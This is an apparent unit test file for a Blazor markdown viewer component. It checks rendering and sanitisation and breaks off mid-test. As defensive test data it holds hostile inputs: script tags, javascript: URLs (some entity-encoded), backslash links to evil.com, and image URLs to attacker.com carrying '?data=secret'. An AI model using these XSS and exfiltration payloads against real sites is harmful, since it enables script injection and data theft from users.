using Bunit;
using Microsoft.VisualStudio.TestTools.UnitTesting;
using System;
using System.Linq;

namespace Bit.BlazorUI.Tests.Components.Extras.MarkdownViewer;

[TestClass]
public class BitMarkdownViewerTests : BunitTestContext
{
    [TestMethod]
    public void BitMarkdownViewerShouldRenderExpectedClass()
    {
        var component = RenderComponent<BitMarkdownViewer>();

        var root = component.Find(".bit-mdv");

        Assert.IsNotNull(root);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldRenderHeading()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "# hello");
        });

        var root = component.Find(".bit-mdv");

        Assert.Contains("<h1>hello</h1>", root.InnerHtml);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldRenderInlineFormatting()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "a **bold** and *italic* word");
        });

        var root = component.Find(".bit-mdv");

        Assert.Contains("<strong>bold</strong>", root.InnerHtml);
        Assert.Contains("<em>italic</em>", root.InnerHtml);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldTreatRawHtmlAsText()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "<script>alert(1)</script>");
        });

        var root = component.Find(".bit-mdv");

        // Raw HTML must be escaped (rendered as text), never as live markup.
        Assert.DoesNotContain("<script>", root.InnerHtml);
        Assert.Contains("&lt;script&gt;", root.InnerHtml);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldSanitizeUnsafeLinks()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "[click](javascript:alert(1))");
        });

        // Validate the rendered link's actual href rather than a substring of the HTML.
        // Removing the unsafe node entirely is also a valid (secure) sanitizer outcome.
        var links = component.FindAll(".bit-mdv a");
        if (links.Count > 0)
        {
            var href = links[0].GetAttribute("href") ?? string.Empty;
            Assert.IsTrue(
                href.Length == 0 || !href.Contains("javascript:", StringComparison.OrdinalIgnoreCase),
                $"Unsafe link href was not sanitized: '{href}'.");
        }
    }

    [TestMethod,
        DataRow(@"\\evil.com"),
        DataRow(@"/\evil.com"),
        DataRow(@"\/evil.com")]
    public void BitMarkdownViewerShouldSanitizeBackslashLinks(string url)
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            // Browsers treat leading backslashes like slashes (protocol-relative),
            // including mixed separator runs (BitMarkdownUrlSanitizer).
            parameters.Add(p => p.Markdown, $"[click]({url})");
        });

        var links = component.FindAll(".bit-mdv a");
        if (links.Count > 0)
        {
            var href = links[0].GetAttribute("href") ?? string.Empty;
            var leadingSeparators = href.TakeWhile(c => c is '/' or '\\');
            Assert.IsTrue(
                href.Length == 0 || !leadingSeparators.Contains('\\'),
                $"Backslash link href was not sanitized: '{href}'.");
        }
    }

    [TestMethod]
    public void BitMarkdownViewerShouldSanitizeUnsafeImages()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "![alt](javascript:alert(1))");
        });

        // Validate the rendered image's actual src rather than a substring of the HTML.
        // Removing the unsafe node entirely is also a valid (secure) sanitizer outcome.
        var imgs = component.FindAll(".bit-mdv img");
        if (imgs.Count > 0)
        {
            var src = imgs[0].GetAttribute("src") ?? string.Empty;
            Assert.IsTrue(
                src.Length == 0 || !src.Contains("javascript:", StringComparison.OrdinalIgnoreCase),
                $"Unsafe image src was not sanitized: '{src}'.");
        }
    }

    [TestMethod]
    public void BitMarkdownViewerShouldReparseWhenMarkdownChanges()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "# one");
        });

        Assert.Contains("<h1>one</h1>", component.Markup);

        component.Render(parameters =>
        {
            parameters.Add(p => p.Markdown, "# two");
        });

        Assert.Contains("<h1>two</h1>", component.Markup);
        Assert.DoesNotContain("<h1>one</h1>", component.Markup);
    }

    [TestMethod,
        DataRow(true),
        DataRow(false)]
    public void BitMarkdownViewerShouldRespectIsEnabled(bool isEnabled)
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.IsEnabled, isEnabled);
            parameters.Add(p => p.Markdown, "enable");
        });

        var root = component.Find(".bit-mdv");

        if (isEnabled)
        {
            Assert.IsFalse(root.ClassList.Contains("bit-dis"));
        }
        else
        {
            Assert.IsTrue(root.ClassList.Contains("bit-dis"));
        }
    }

    [TestMethod]
    public void BitMarkdownViewerBasicPipelineShouldNotRenderTables()
    {
        var markdown = "| a | b |\n|---|---|\n| 1 | 2 |";

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, markdown);
        });

        Assert.DoesNotContain("<table", component.Markup);
    }

    [TestMethod]
    public void BitMarkdownViewerGitHubPipelineShouldRenderGfmFeatures()
    {
        var markdown = "~~gone~~\n\n| a | b |\n|---|---|\n| 1 | 2 |\n\n- [x] done\n- [ ] todo";

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, markdown);
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.GitHub);
        });

        var markup = component.Markup;

        Assert.Contains("<del>gone</del>", markup);
        Assert.Contains("<table", markup);
        Assert.Contains("type=\"checkbox\"", markup);
    }

    [TestMethod]
    public void BitMarkdownViewerAdvancedPipelineShouldRenderEmojiAndHeadingIds()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "# Hello World :rocket:");
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.Advanced);
        });

        var markup = component.Markup;

        Assert.Contains("🚀", markup);
        Assert.Contains("id=\"hello-world\"", markup);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldReparseWhenPipelineChanges()
    {
        var markdown = "~~gone~~";

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, markdown);
        });

        Assert.DoesNotContain("<del>gone</del>", component.Markup);

        component.Render(parameters =>
        {
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.GitHub);
        });

        Assert.Contains("<del>gone</del>", component.Markup);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldBlockRemoteImagesInSameOriginMode()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "![leak](https://attacker.com/leak?data=secret)");
            parameters.Add(p => p.ImageRendering, BitMarkdownViewerImageRendering.SameOrigin);
        });

        var imgs = component.FindAll(".bit-mdv img");
        Assert.AreEqual(1, imgs.Count);
        // No src means the browser never issues the cross-origin (exfiltration) request.
        var src = imgs[0].GetAttribute("src") ?? string.Empty;
        Assert.AreEqual(string.Empty, src);
        // Alt text is preserved for accessibility.
        Assert.AreEqual("leak", imgs[0].GetAttribute("alt"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldKeepRelativeImagesInSameOriginMode()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "![local](/assets/logo.png)");
            parameters.Add(p => p.ImageRendering, BitMarkdownViewerImageRendering.SameOrigin);
        });

        var imgs = component.FindAll(".bit-mdv img");
        Assert.AreEqual(1, imgs.Count);
        Assert.AreEqual("/assets/logo.png", imgs[0].GetAttribute("src"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldKeepAbsoluteSameOriginImagesInSameOriginMode()
    {
        // bUnit's test host resolves to http://localhost/, so an absolute URL that points
        // back at that origin must NOT be blocked under the SameOrigin policy.
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "![local](http://localhost/assets/logo.png)");
            parameters.Add(p => p.ImageRendering, BitMarkdownViewerImageRendering.SameOrigin);
        });

        var imgs = component.FindAll(".bit-mdv img");
        Assert.AreEqual(1, imgs.Count);
        Assert.AreEqual("http://localhost/assets/logo.png", imgs[0].GetAttribute("src"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldBlockRemoteImagesByDefault()
    {
        // ImageRendering defaults to the safe SameOrigin policy, so a cross-origin image
        // is blocked even when the parameter is not set explicitly.
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "![leak](https://attacker.com/leak?data=secret)");
        });

        var imgs = component.FindAll(".bit-mdv img");
        Assert.AreEqual(1, imgs.Count);
        Assert.AreEqual(string.Empty, imgs[0].GetAttribute("src") ?? string.Empty);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldBlockProtocolRelativeImagesInSameOriginMode()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "![x](//attacker.com/a.png)");
            parameters.Add(p => p.ImageRendering, BitMarkdownViewerImageRendering.SameOrigin);
        });

        var imgs = component.FindAll(".bit-mdv img");
        Assert.AreEqual(1, imgs.Count);
        Assert.AreEqual(string.Empty, imgs[0].GetAttribute("src") ?? string.Empty);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldBlockAllImagesInNoneMode()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "![local](/assets/logo.png)");
            parameters.Add(p => p.ImageRendering, BitMarkdownViewerImageRendering.None);
        });

        var imgs = component.FindAll(".bit-mdv img");
        Assert.AreEqual(1, imgs.Count);
        Assert.AreEqual(string.Empty, imgs[0].GetAttribute("src") ?? string.Empty);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldAddNoReferrerToImages()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "![x](https://example.com/a.png)");
            parameters.Add(p => p.ImageRendering, BitMarkdownViewerImageRendering.All);
        });

        var imgs = component.FindAll(".bit-mdv img");
        Assert.AreEqual(1, imgs.Count);
        Assert.AreEqual("https://example.com/a.png", imgs[0].GetAttribute("src"));
        Assert.AreEqual("no-referrer", imgs[0].GetAttribute("referrerpolicy"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldNotOverflowOnDeeplyNestedInput()
    {
        // Without a depth limit this triggers an (uncatchable) StackOverflowException
        // that would crash the host. The depth guard must keep it bounded.
        var markdown = new string('>', 5000) + " boom";

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, markdown);
        });

        Assert.Contains("boom", component.Markup);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldStripBidiControlCharactersWhenEnabled()
    {
        // U+202E (RIGHT-TO-LEFT OVERRIDE) is a Trojan-Source spoofing character.
        var markdown = "a\u202Eb";

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, markdown);
            parameters.Add(p => p.StripBidiControlCharacters, true);
        });

        Assert.DoesNotContain("\u202E", component.Markup);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldKeepBidiControlCharactersByDefault()
    {
        var markdown = "a\u202Eb";

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, markdown);
        });

        Assert.Contains("\u202E", component.Markup);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldReparseWhenHardeningOptionsChange()
    {
        // The component caches the parsed AST and only re-parses when an output-affecting
        // input changes. Toggling the hardening options after the first render must
        // invalidate that cache instead of reusing stale state.
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "![leak](https://attacker.com/a.png)\n\n# hello world");
            parameters.Add(p => p.ImageRendering, BitMarkdownViewerImageRendering.All);
        });

        // First render: All policy keeps the remote image and the full heading text.
        Assert.AreEqual("https://attacker.com/a.png", component.FindAll(".bit-mdv img")[0].GetAttribute("src"));
        Assert.Contains("<h1>hello world</h1>", component.Markup);

        // Tighten ImageRendering and cap the length; the cached AST must be rebuilt.
        component.Render(parameters =>
        {
            parameters.Add(p => p.ImageRendering, BitMarkdownViewerImageRendering.SameOrigin);
            parameters.Add(p => p.MaxLength, 38); // truncates before "world"
        });

        Assert.AreEqual(string.Empty, component.FindAll(".bit-mdv img")[0].GetAttribute("src") ?? string.Empty);
        Assert.DoesNotContain("world", component.Markup);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldReparseWhenStripBidiToggles()
    {
        var markdown = "a\u202Eb";

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, markdown);
        });

        // Default keeps the bidi control character.
        Assert.Contains("\u202E", component.Markup);

        component.Render(parameters =>
        {
            parameters.Add(p => p.StripBidiControlCharacters, true);
        });

        Assert.DoesNotContain("\u202E", component.Markup);
    }

    [TestMethod,
        DataRow("۱."),          // Extended Arabic-Indic (Persian) digit one
        DataRow("١."),          // Arabic-Indic digit one
        DataRow("१."),          // Devanagari digit one
        DataRow("１."),          // Fullwidth digit one
        DataRow("۱) item"),
        DataRow("۱. item")]
    public void BitMarkdownViewerShouldNotTreatNonAsciiDigitsAsOrderedListMarkers(string markdown)
    {
        // .NET's \d matches every Unicode decimal digit, so these lines used to be taken
        // for ordered list markers and then fed to int.Parse, which throws (only ASCII
        // digits parse). CommonMark restricts the marker to ASCII digits, so they must
        // render as ordinary paragraph text.
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, markdown);
        });

        var markup = component.Markup;

        Assert.DoesNotContain("<ol", markup);
        Assert.Contains(markdown[..1], markup);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldStillRenderAsciiOrderedLists()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "3. three\n4. four");
        });

        var markup = component.Markup;

        Assert.Contains("<ol", markup);
        Assert.Contains("start=\"3\"", markup);
        Assert.AreEqual(2, component.FindAll(".bit-mdv ol li").Count);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldRespectMaxLength()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "# hello world");
            parameters.Add(p => p.MaxLength, 3); // "# h"
        });

        var markup = component.Markup;
        Assert.Contains("<h1>h</h1>", markup);
        Assert.DoesNotContain("hello", markup);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldNotSplitSurrogatePairsWhenTruncating()
    {
        // "# " + a rocket, whose emoji occupies two chars. Cutting at 3 would leave a lone
        // high surrogate, which renders as a replacement character.
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "# \U0001F680 boom");
            parameters.Add(p => p.MaxLength, 3);
        });

        Assert.DoesNotContain("�", component.Markup);
    }

    // -- Link reference definitions and reference links ----------------------

    [TestMethod]
    public void BitMarkdownViewerShouldResolveFullReferenceLinks()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "See [the docs][docs].\n\n[docs]: https://bitplatform.dev \"bit\"");
        });

        var link = component.Find(".bit-mdv a");

        Assert.AreEqual("https://bitplatform.dev", link.GetAttribute("href"));
        Assert.AreEqual("bit", link.GetAttribute("title"));
        Assert.AreEqual("the docs", link.TextContent);
        // The definition itself is not part of the rendered document.
        Assert.DoesNotContain("[docs]:", component.Markup);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldResolveCollapsedAndShortcutReferences()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "[bit][] and [bit].\n\n[bit]: https://bitplatform.dev");
        });

        var links = component.FindAll(".bit-mdv a");

        Assert.AreEqual(2, links.Count);
        Assert.AreEqual("https://bitplatform.dev", links[0].GetAttribute("href"));
        Assert.AreEqual("https://bitplatform.dev", links[1].GetAttribute("href"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldResolveReferencesDefinedBeforeUse()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "[bit]: https://bitplatform.dev\n\nGo to [bit].");
        });

        Assert.AreEqual("https://bitplatform.dev", component.Find(".bit-mdv a").GetAttribute("href"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldMatchReferenceLabelsCaseAndWhitespaceInsensitively()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "[Hello   World]\n\n[hello world]: /x");
        });

        Assert.AreEqual("/x", component.Find(".bit-mdv a").GetAttribute("href"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldResolveReferenceImages()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "![a cat][cat]\n\n[cat]: /cat.png");
        });

        var img = component.Find(".bit-mdv img");

        Assert.AreEqual("/cat.png", img.GetAttribute("src"));
        Assert.AreEqual("a cat", img.GetAttribute("alt"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldSanitizeReferenceDefinitionUrls()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "[click][evil]\n\n[evil]: javascript:alert(1)");
        });

        var link = component.Find(".bit-mdv a");

        Assert.IsFalse(link.HasAttribute("href"));
        Assert.DoesNotContain("javascript:", component.Markup);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldLeaveUnresolvedReferencesAsText()
    {
        // The document defines "b", so the pre-scan is active, yet "[a]" has no definition
        // and must read exactly as it was written.
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "[a] then [b]\n\n[b]: /b");
        });

        var markup = component.Markup;

        Assert.Contains("[a] then", markup);
        Assert.AreEqual(1, component.FindAll(".bit-mdv a").Count);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldNotTreatBracketedTextAsReferenceWithoutDefinitions()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "see [1] and [note] here");
        });

        var markup = component.Markup;

        Assert.Contains("[1] and [note] here", markup);
        Assert.AreEqual(0, component.FindAll(".bit-mdv a").Count);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldKeepTaskListsWorkingAlongsideReferenceDefinitions()
    {
        // The definition switches the reference machinery on; the "[ ]" and "[x]" markers
        // must still reach the task-list processor as one text run.
        var markdown = "- [x] done\n- [ ] todo\n\n[ref]: /r";

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, markdown);
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.GitHub);
        });

        Assert.AreEqual(2, component.FindAll(".bit-mdv input[type=checkbox]").Count);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldNotReadIndentedDefinitionsAsDefinitions()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "    [a]: /a");
        });

        // Four spaces make it an indented code block, not a definition.
        Assert.Contains("<pre>", component.Markup);
        Assert.Contains("[a]: /a", component.Markup);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldReadTitleOnTheLineAfterTheDestination()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "[a]\n\n[a]: /url\n   \"the title\"");
        });

        var link = component.Find(".bit-mdv a");

        Assert.AreEqual("/url", link.GetAttribute("href"));
        Assert.AreEqual("the title", link.GetAttribute("title"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldUseTheFirstOfSeveralDefinitionsOfALabel()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "[a]\n\n[a]: /first\n\n[a]: /second");
        });

        Assert.AreEqual("/first", component.Find(".bit-mdv a").GetAttribute("href"));
    }

    // -- Entity and numeric character references -----------------------------

    [TestMethod]
    [DataRow("&copy;", "©")]
    [DataRow("&#169;", "©")]
    [DataRow("&#xA9;", "©")]
    [DataRow("&hellip;", "…")]
    [DataRow("&mdash;", "—")]
    public void BitMarkdownViewerShouldDecodeCharacterReferences(string markdown, string expected)
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, markdown);
        });

        Assert.AreEqual(expected, component.Find(".bit-mdv p").TextContent);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldEscapeTextDecodedFromCharacterReferences()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "&lt;script&gt;alert(1)&lt;/script&gt;");
        });

        // The decoded characters are text, so they are escaped again on the way to the DOM
        // and can never become live markup.
        Assert.DoesNotContain("<script>", component.Markup);
        Assert.AreEqual("<script>alert(1)</script>", component.Find(".bit-mdv p").TextContent);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldLeaveUnknownAndMalformedReferencesAlone()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "&nosuchentity; &#; AT&T");
        });

        Assert.AreEqual("&nosuchentity; &#; AT&T", component.Find(".bit-mdv p").TextContent);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldNotDecodeCharacterReferencesInsideCode()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "`&copy;`\n\n```\n&copy;\n```");
        });

        Assert.AreEqual("&copy;", component.Find(".bit-mdv code").TextContent);
        Assert.AreEqual("&copy;", component.Find(".bit-mdv pre code").TextContent);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldReplaceOutOfRangeNumericReferences()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "&#0; &#xD800;");
        });

        Assert.AreEqual("� �", component.Find(".bit-mdv p").TextContent);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldSanitizeUrlsAfterDecodingCharacterReferences()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "[x](&#x6A;avascript:alert(1))");
        });

        Assert.IsFalse(component.Find(".bit-mdv a").HasAttribute("href"));
    }

    // -- Footnotes -----------------------------------------------------------

    [TestMethod]
    public void BitMarkdownViewerShouldRenderFootnotes()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "Text with a note[^1].\n\n[^1]: The note itself.");
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.Advanced);
        });

        var markup = component.Markup;

        Assert.Contains("class=\"footnote-ref\"", markup);
        Assert.Contains("href=\"#fn-1\"", markup);
        Assert.Contains("id=\"fnref-1\"", markup);
        Assert.Contains("id=\"fn-1\"", markup);
        Assert.Contains("The note itself.", markup);
        Assert.Contains("class=\"footnote-backref\"", markup);
        // The definition is lifted out of the flow into the footnotes section.
        Assert.DoesNotContain("[^1]:", markup);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldNumberFootnotesByOrderOfReference()
    {
        var markdown = "First[^b] then second[^a].\n\n[^a]: A.\n[^b]: B.";

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, markdown);
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.Advanced);
        });

        var items = component.FindAll(".bit-mdv .footnotes li");

        Assert.AreEqual(2, items.Count);
        Assert.Contains("B.", items[0].TextContent);
        Assert.Contains("A.", items[1].TextContent);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldGiveEachFootnoteCitationItsOwnBackLink()
    {
        var markdown = "One[^n] and two[^n].\n\n[^n]: The note.";

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, markdown);
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.Advanced);
        });

        var markup = component.Markup;

        Assert.Contains("id=\"fnref-1\"", markup);
        Assert.Contains("id=\"fnref-1-2\"", markup);
        Assert.AreEqual(2, component.FindAll(".bit-mdv .footnote-backref").Count);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldDropFootnoteDefinitionsNobodyCites()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "Just text.\n\n[^unused]: Nothing points here.");
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.Advanced);
        });

        var markup = component.Markup;

        Assert.DoesNotContain("class=\"footnotes\"", markup);
        Assert.DoesNotContain("Nothing points here.", markup);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldNotRenderFootnotesWithoutTheExtension()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "Text[^1].\n\n[^1]: The note.");
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.Basic);
        });

        Assert.DoesNotContain("class=\"footnote-ref\"", component.Markup);
        Assert.DoesNotContain("class=\"footnotes\"", component.Markup);
    }

    // -- Alerts --------------------------------------------------------------

    [TestMethod]
    [DataRow("NOTE", "note", "Note")]
    [DataRow("TIP", "tip", "Tip")]
    [DataRow("IMPORTANT", "important", "Important")]
    [DataRow("WARNING", "warning", "Warning")]
    [DataRow("CAUTION", "caution", "Caution")]
    public void BitMarkdownViewerShouldRenderGitHubAlerts(string marker, string cssKind, string title)
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, $"> [!{marker}]\n> Something worth knowing.");
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.Advanced);
        });

        var alert = component.Find($".bit-mdv .markdown-alert-{cssKind}");

        Assert.AreEqual(title, component.Find(".bit-mdv .markdown-alert-title").TextContent);
        Assert.Contains("Something worth knowing.", alert.TextContent);
        Assert.AreEqual(0, component.FindAll(".bit-mdv blockquote").Count);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldLeaveOrdinaryBlockquotesAlone()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "> just a quote");
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.Advanced);
        });

        Assert.AreEqual(1, component.FindAll(".bit-mdv blockquote").Count);
        Assert.AreEqual(0, component.FindAll(".bit-mdv .markdown-alert").Count);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldNotTreatAMarkerFollowedByTextAsAnAlert()
    {
        // GitHub requires the marker to be alone on the first line.
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "> [!NOTE] inline text");
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.Advanced);
        });

        Assert.AreEqual(0, component.FindAll(".bit-mdv .markdown-alert").Count);
        Assert.AreEqual(1, component.FindAll(".bit-mdv blockquote").Count);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldNotRenderAlertsWithoutTheExtension()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "> [!NOTE]\n> Something.");
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.Basic);
        });

        Assert.AreEqual(0, component.FindAll(".bit-mdv .markdown-alert").Count);
        Assert.AreEqual(1, component.FindAll(".bit-mdv blockquote").Count);
    }

    [TestMethod]
    public void BitMarkdownViewerGitHubPipelineShouldCarryFootnotesAndAlerts()
    {
        // A footnote definition is also a valid link reference definition, so a pipeline
        // with the rest of the GitHub flavors must carry footnotes too - otherwise the note
        // silently becomes a link destination.
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "Text[^1].\n\n[^1]: The note.\n\n> [!TIP]\n> Do this.");
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.GitHub);
        });

        Assert.Contains("class=\"footnote-ref\"", component.Markup);
        Assert.AreEqual(1, component.FindAll(".bit-mdv .markdown-alert-tip").Count);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldKeepUnresolvedFootnoteReferencesAsWritten()
    {
        // "[^b]" has no definition; "[^a]" does, which is what turns the pre-scan on.
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "One[^a] two[^B].\n\n[^a]: A note.");
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.Advanced);
        });

        Assert.Contains("two[^B].", component.Markup);
        Assert.AreEqual(1, component.FindAll(".bit-mdv .footnote-ref").Count);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldNotNestLinksInsideReferenceLinks()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "[[inner]][outer]\n\n[inner]: /i\n[outer]: /o");
        });

        var links = component.FindAll(".bit-mdv a");

        Assert.AreEqual(1, links.Count);
        Assert.AreEqual("/o", links[0].GetAttribute("href"));
        // The inner link is unwrapped; its content survives as the outer link's text.
        Assert.AreEqual("inner", links[0].TextContent);
    }

    // -- Soft line breaks ----------------------------------------------------

    [TestMethod]
    public void BitMarkdownViewerShouldRenderSoftBreaksAsHardBreaksWhenEnabled()
    {
        var pipeline = new BitMarkdownPipelineBuilder().UseSoftLineAsHardLine().Build();

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "line one\nline two");
            parameters.Add(p => p.Pipeline, pipeline);
        });

        Assert.AreEqual(1, component.FindAll(".bit-mdv br").Count);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldKeepSoftBreaksSoftByDefault()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "line one\nline two");
        });

        Assert.AreEqual(0, component.FindAll(".bit-mdv br").Count);
    }

    // -- Rendering details ---------------------------------------------------

    [TestMethod]
    public void BitMarkdownViewerShouldAlignTableColumnsWithClassesNotInlineStyles()
    {
        var markdown = "| l | c | r |\n|:--|:-:|--:|\n| 1 | 2 | 3 |";

